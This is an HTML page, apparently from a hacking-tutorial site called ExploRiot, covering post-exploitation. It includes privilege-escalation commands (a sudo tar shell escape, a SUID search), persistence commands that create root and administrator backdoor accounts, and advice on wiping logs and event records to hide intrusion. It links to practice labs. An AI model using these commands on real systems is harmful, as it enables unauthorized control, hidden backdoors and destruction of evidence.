@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ExploRiot - Phase 3: Post-Exploitation</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Press+Start+2P&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="phase-title-container">
+            <h1 class="phase-number">PHASE 3</h1>
+            <h1 class="phase-name">POST-EXPLOITATION & PRIVILEGE ESCALATION</h1>
+        </div>
+
+        <div class="objective-box">
+            <p>You're inside. Now what? Become root, cover your tracks, set traps, and stay the fuck in.</p>
+        </div>
+
+        <h2>🪜 1. Privilege Escalation – From Peasant to King</h2>
+        <p>If you pop a low-priv shell, congrats. You’re the janitor. But we want root or NT AUTHORITY\SYSTEM. Here’s how:</p>
+
+        <h3>🔹 On Linux:</h3>
+        <h4>🧷 Enumerate Everything</h4>
+        <p>Run recon scripts to scan for misconfigs, weak permissions, and suid binaries.</p>
+        <p>Tools:</p>
+        <ul>
+            <li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener noreferrer">linpeas.sh</a></li>
+            <li><a href="https://github.com/jondonas/linux-exploit-suggester-2" target="_blank" rel="noopener noreferrer">linux-exploit-suggester.sh</a> (Note: Many variants exist)</li>
+        </ul>
+        <p>Manual:</p>
+        <pre><code>uname -a
+ps aux
+sudo -l
+find / -perm -4000 -type f 2>/dev/null</code></pre>
+
+        <h4>📜 Sudo Misconfig</h4>
+        <p>Run <code>sudo -l</code>. If you can run a binary without a password, check <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a> for a privesc method.</p>
+        <p>Example:</p>
+        <pre><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
+
+        <h4>💥 Exploitable SUID Binaries</h4>
+        <p>Some binaries marked as root-executable (<code>chmod 4000</code>) are vulnerable.</p>
+        <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+        <p>Try them against <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a> again.</p>
+
+        <h3>🔹 On Windows:</h3>
+        <h4>🔍 Tools:</h4>
+        <pre><code>whoami /priv
+systeminfo</code></pre>
+        <ul>
+            <li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank" rel="noopener noreferrer">WinPEAS</a></li>
+            <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener noreferrer">PowerUp.ps1</a> (Part of PowerSploit)</li>
+        </ul>
+
+        <h4>🔓 UAC Bypass</h4>
+        <p>Find vulnerable apps or scripts auto-run by admin but modifiable by user. Exploit AlwaysInstallElevated registry key if it's misconfigured.</p>
+
+        <h4>🧱 Insecure Service Paths</h4>
+        <p>Services that run with SYSTEM privileges but let users edit the binary = instant SYSTEM shell.</p>
+        <pre><code>Get-WmiObject win32_service | findstr "C:\\"</code></pre>
+        <h2>🧬 2. Persistence – You’re Not Leaving</h2>
+        <p>You want to own the system long after the initial pwn. Set your hooks.</p>
+        <h3>🔹 On Linux:</h3>
+        <ul>
+            <li>Add backdoor user:
+                <pre><code>useradd -ou 0 -g 0 backdoor && passwd backdoor</code></pre>
+            </li>
+            <li>Cron job that keeps re-dropping your shell</li>
+            <li>SSH key injection into <code>~/.ssh/authorized_keys</code></li>
+        </ul>
+
+        <h3>🔹 On Windows:</h3>
+        <ul>
+            <li>Create new admin user:
+                <pre><code>net user backdoor p@ss123 /add
+net localgroup administrators backdoor /add</code></pre>
+            </li>
+            <li>Registry Run Keys:
+                <pre><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></pre>
+            </li>
+            <li>Scheduled Task that runs your payload every startup</li>
+        </ul>
+
+        <h2>🩻 3. Cover Your Tracks</h2>
+        <p>You’re not a pro if your logs scream “I was here lol.”</p>
+        <ul>
+            <li>Delete <code>.bash_history</code>, temp files, logs</li>
+            <li>Wipe Event Viewer in Windows</li>
+            <li>Use in-memory payloads (<a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer">Meterpreter</a>, <a href="https://www.cobaltstrike.com/" target="_blank" rel="noopener noreferrer">Cobalt Strike</a> Beacon) to avoid disk I/O</li>
+        </ul>
+
+        <h2>🎯 4. Practice Targets</h2>
+        <ul>
+            <li><a href="https://tryhackme.com/module/linux-privilege-escalation" target="_blank" rel="noopener noreferrer">TryHackMe: Linux PrivEsc</a></li>
+            <li><a href="https://www.hackthebox.com/" target="_blank" rel="noopener noreferrer">HackTheBox Machines</a></li>
+            <li><a href="https://overthewire.org/wargames/" target="_blank" rel="noopener noreferrer">OverTheWire: Narnia, Leviathan, etc.</a></li>
+        </ul>
+
+        <div class="back-button-container">
+            <a href="index.html" class="back-button">Back to Index</a>
+        </div>
+    </div>
+
+    <footer class="footer">
+        ExploRiot &copy; 2025
+    </footer>
+</body>
+</html>
